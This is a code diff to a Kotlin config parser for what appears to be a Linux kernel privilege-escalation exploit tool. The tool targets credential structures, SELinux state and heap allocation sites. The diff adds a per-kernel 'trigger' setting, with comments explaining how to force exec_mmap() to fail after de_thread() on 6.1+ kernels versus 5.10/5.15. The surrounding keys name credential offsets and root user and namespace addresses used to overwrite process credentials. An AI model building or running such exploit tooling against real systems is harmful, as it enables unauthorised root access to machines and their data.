@@ -29,8 +29,18 @@ data class CredOverlay(
 /** Where the `mm_page_alloc` raw record carries `gfp_flags` (5.10: 0x14/4, 6.x: 0x18/8). */
 data class TraceLayout(val gfpOffset: Long, val gfpSize: Long)
 
+/**
+ * How `exec_mmap()` can be made to fail after `de_thread()` — the per-kernel
+ * trigger the tool selects. `KILLABLE`: 6.1+ takes `mmap_read_lock_killable`,
+ * so a pending fatal signal aborts it. `CORE_STATE`: 5.10/5.15 takes the
+ * non-killable lock and fails only while a coredump is in progress on the
+ * old mm.
+ */
+enum class TimerTrigger { KILLABLE, CORE_STATE }
+
 data class Timer98260Config(
     val version: Int,
+    val trigger: TimerTrigger,
     val fakeSupported: Boolean,
     val timerSiteLower21Bit: Long,
     val timerObjectSize: Long,
@@ -60,6 +70,7 @@ object Timer98260 {
 
     private val BlockKeys = setOf(
         "version",
+        "trigger",
         "timer_site_lower_21bit", "timer_object_size", "cred_request_size", "cred_alloc_size", "cred_uid_offset",
         "static_timer_site", "task_alloc_site_lower_21bit", "task_alloc_size", "task_cred_offset",
         "selinux_state", "panic_on_warn", "root_user", "init_user_ns", "init_ucounts",
@@ -157,6 +168,26 @@ object Timer98260 {
         // The block carries no mode key: any fake constant selects the fake
         // set, and the real five are always required.
         val fakeSupported = FakeKeys.any { block.containsKey(it) }
+        // The exec trigger is a per-kernel fact. A fake block must carry it
+        // (the way-2 path runs the trigger); a legacy real-only block predates
+        // the key and keeps the 6.1-era default.
+        val triggerRaw = block["trigger"]
+        val trigger = when {
+            triggerRaw == null -> {
+                if (fakeSupported) err("trigger", "required with the fake constants")
+                TimerTrigger.KILLABLE
+            }
+            triggerRaw !is String -> {
+                err("trigger", "must be a string")
+                TimerTrigger.KILLABLE
+            }
+            triggerRaw == "killable" -> TimerTrigger.KILLABLE
+            triggerRaw == "core_state" -> TimerTrigger.CORE_STATE
+            else -> {
+                err("trigger", "must be \"killable\" or \"core_state\"")
+                TimerTrigger.KILLABLE
+            }
+        }
         // --- real path -----------------------------------------------------
         val timerSiteLow21 = long("timer_site_lower_21bit")
         if (timerSiteLow21 != null && timerSiteLow21 !in 0L..0x1fffffL) {
@@ -283,6 +314,7 @@ object Timer98260 {
         if (errors.isNotEmpty()) return null to errors
         val config = Timer98260Config(
             version = 1,
+            trigger = trigger,
             fakeSupported = fakeSupported,
             timerSiteLower21Bit = timerSiteLow21!!,
             timerObjectSize = timerAlloc!!,
